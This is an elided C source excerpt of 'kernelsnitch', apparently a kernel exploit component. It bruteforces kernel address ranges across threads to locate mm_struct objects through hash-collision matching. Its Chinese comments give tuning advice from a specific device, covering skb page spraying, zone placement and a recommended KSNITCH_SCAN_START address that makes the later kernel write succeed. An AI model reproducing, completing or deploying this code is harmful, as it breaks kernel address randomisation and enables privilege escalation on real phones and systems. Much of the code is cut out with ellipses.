...
struct kernelsnitch_shared_state {
    ...
    volatile size_t best_match;
    volatile size_t best_mm;

    pthread_t *tids;
    size_t identity_diff;

    /* 扫描范围（默认 IDENTITY_START..IDENTITY_END, 可用 KSNITCH_SCAN_START/END env 覆盖）。
     * ★ PFEM10 实证: mm 落在 DMA32 zone (phys<4GB) 时 skb 喷页无法回收锚点块
     *   （pcp_shaping 只整 Normal zone）→ 写必失败; Normal zone mm → 干净 boot 必成功。
     *   故探针运行前应设 KSNITCH_SCAN_START=0xffffff8080000000 (phys 4GB=Normal 起点)。 */
    size_t scan_start;
    size_t scan_end;
            ...
            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
                ...
                if (!ks->mte_enabled) {
                    ...
                    for (size_t i = 1; i < ks->collisions && found_hash; ++i) {
                        ...
                        if (found_hash) match_cnt++;
                    }
                    /* diagnostic: remember best partial match */
                    if (match_cnt > ks->best_match && !ks->found) {
                        ks->best_match = match_cnt;
                        ks->best_mm = mm_struct_candidate;
                    }
                    if (found_hash) {
...
struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
{
    ...
    {
        const char *e;
        ks->scan_start = (size_t)IDENTITY_START;
        ks->scan_end   = (size_t)IDENTITY_END;
        e = getenv("KSNITCH_SCAN_START");
        if (e && *e) ks->scan_start = (size_t)strtoull(e, NULL, 0);
        e = getenv("KSNITCH_SCAN_END");
        if (e && *e) ks->scan_end   = (size_t)strtoull(e, NULL, 0);
        if (ks->scan_end <= ks->scan_start || ks->scan_start < (size_t)IDENTITY_START)
            ks->scan_start = (size_t)IDENTITY_START;
        if (ks->scan_end <= ks->scan_start)
            ks->scan_end = (size_t)IDENTITY_END;
        ks->identity_diff = ((ks->scan_end - ks->scan_start)/ks->thread_cnt);
        if (ks->verbose) pr_info("scan range [%016zx-%016zx] (env override: KSNITCH_SCAN_START/END)\n",
            ks->scan_start, ks->scan_end);
    }
...
void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
{
    ...
    for (size_t i = 0; i < ks->thread_cnt; ++i) {
        ...
        mm_leak_arg->range.start = ks->scan_start + ks->identity_diff*i;
        mm_leak_arg->range.end = ks->scan_start + ks->identity_diff*(i+1);
...
size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
{
    ...
    if (ks->verbose) pr_info("done (best partial match=%zu at 0x%zx, found=%zu)\n", ks->best_match, ks->best_mm, ks->found);
